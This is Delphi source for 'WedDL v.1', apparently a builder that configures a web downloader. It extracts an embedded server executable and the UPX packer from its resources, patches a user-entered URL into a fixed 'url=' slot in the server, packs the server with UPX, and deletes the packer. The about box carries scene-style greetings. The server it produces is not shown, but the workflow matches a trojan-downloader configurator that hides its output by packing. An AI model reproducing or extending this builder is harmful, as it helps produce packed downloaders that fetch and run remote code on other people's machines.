unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    Label1: TLabel;
    Label2: TLabel;
    Panel1: TPanel;
    Label3: TLabel;
    Edit1: TEdit;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    Label4: TLabel;
    Button1: TButton;
    Button2: TButton;
    Label5: TLabel;
    procedure Button3Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure ShowSettings(lpFileName:string);
    function  ValidFile(cPos:longint):Boolean;
    procedure ReadFile(lpFileName:string;var lpFileBuffer:string);
    function  AdjustString(lpString:string; lpSize:integer):string;
    procedure SaveSettings(lpFileName:string;NewFile:string);
    procedure ExtractRes(ResType,ResName,ResNewName:String);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;
const
  FIL:string='url=';
var
  Form1: TForm1;

implementation

{$R *.dfm}
{$R G.res}

procedure TForm1.Button3Click(Sender: TObject);
begin
messagebox(0,'??','??',mb_ok);
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
messagebox(0,'======'+#13#10+
             'WedDL v.1'+#13#10+
             '======'+#13#10+
             'Made by SiC'+#13#10+
             'Greets to :'+#13#10+
             'akCUM, otis, fsb'+#13#10+
             'Da`Great`1, crow'+#13#10+
             'n00nah, PeWe'+#13#10+
             'Jesus and all his b-f''s'+#13#10+
             'D-oNe, aphex'+#13#10+
             'ZATRiX, Ars3n'+#13#10+
             'SBD_Spider, J(AY)'+#13#10+
             'and all of the fuckers'+#13#10+
             'ive missed to greet'+#13#10+
             '======'+#13#10+
             'BARGH#L','AB0ut',mb_ok);
end;

procedure TForm1.ShowSettings(lpFileName:string);
var
   fContent:string;
   a:longint;
   a1:string;

begin

   ReadFile(lpFileName,fContent);

   a:=pos(FIL,fcontent);

   if not ValidFile(a) then Exit;

   a1:=Trim(Copy(fContent,a+ Length(FIL),60));

   fContent:=EmptyStr;

end;


function TForm1.ValidFile(cPos:longint):Boolean;
var
   r:Boolean;

begin
   r:=cPos > 0;

   if not r then
      MessageBox(handle,'Please, select an valid file.',PChar(Caption),MB_ICONERROR);

   ValidFile:=r;

end;


procedure TFORM1.ReadFile(lpFileName:string;var lpFileBuffer:string);
var
   lpFile:File of Char;
   cBuffer:array [1..1024] of Char;
   r,Len:LongInt;

begin
   lpFileBuffer:='';
   AssignFile(lpFile,lpFileName);
   Reset(lpFile);
   Len:=FileSize(lpFile);
   while not Eof(lpFile) do
   begin
      BlockRead(lpFile,cBuffer,1024,r);
      lpFileBuffer:=lpFileBuffer + string(cBuffer)
   end;
   CloseFile(lpFile);
   if Length(lpFileBuffer) > Len then
      lpFileBuffer:=Copy(lpFileBuffer,1,Len);
end;

function Tform1.AdjustString(lpString:string; lpSize:integer):string;
var
   l:integer;
begin
   l:=Length(lpString);
   if l = lpSize then
   begin
      AdjustString:=lpString;
      Exit;
   end;
   if l < lpSize then
   begin
      AdjustString:=lpString + StringOfChar(' ',lpSize - l);
      Exit;
   end;
   if l > lpSize then
   begin
      AdjustString:=Copy(lpString,1,lpSize);
      Exit;
   end;
end;



procedure Tform1.SaveSettings(lpFileName:string;NewFile:string);
var
   fContent:string;
   a,l:longint;
   a1:string;
   lpFile:TextFile;

begin

   ReadFile(lpFileName,fContent);
   l:=Length(fContent);
   if radiobutton1.Checked then
   a1 := trim('0'+edit1.text)  else
   a1 := trim('1'+edit1.text);

   a1 := adjuststring(a1,60);

   a:=Pos(FIL,fContent);

   if not ValidFile(a) then Exit;

fContent:=Copy(fContent,1,a + Length(FIL) - 1) + a1 + Copy(fContent,a + Length(FIL) + 60,l);

   AssignFile(lpFile,NewFile);
   ReWrite(lpFile);
   Writeln(lpFile,fContent);
   CloseFile(lpFile);

   fContent:=EmptyStr;
end;


procedure TForm1.ExtractRes(ResType,ResName,
	ResNewName:String);
var ExeRes:TResourceStream;
begin
    ExeRes:=TResourceStream.Create
	(Hinstance,Resname,Pchar(ResType));
    ExeRes.SavetoFile(ResNewName);
    ExeRes.Free;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
label2.caption:='Extracting Server';
label2.Update;
extractres('exefile','a',extractfilepath(paramstr(0))+'\Serv.exe');
label2.caption:='Extracting UPX';
label2.Update;
extractres('exefile','b',extractfilepath(paramstr(0))+'\A$$.exe');

label2.caption:='Saves Settings';
label2.Update;
savesettings('serv.exe','serv.exe');

label2.caption:='UPX Server';
label2.Update;
winexec(pchar(extractfilepath(paramstr(0))+'\A$$.exe -9 "'+extractfilepath(paramstr(0))+'\Serv.exe'+'"'),0);
label2.caption:='UPX:ing';
label2.Update;
sleep(5000);
label2.caption:='Removes UPX';
label2.Update;
deletefile(pchar(extractfilepath(paramstr(0))+'\A$$.exe'));
label2.caption:='Idle..';
end;

end.
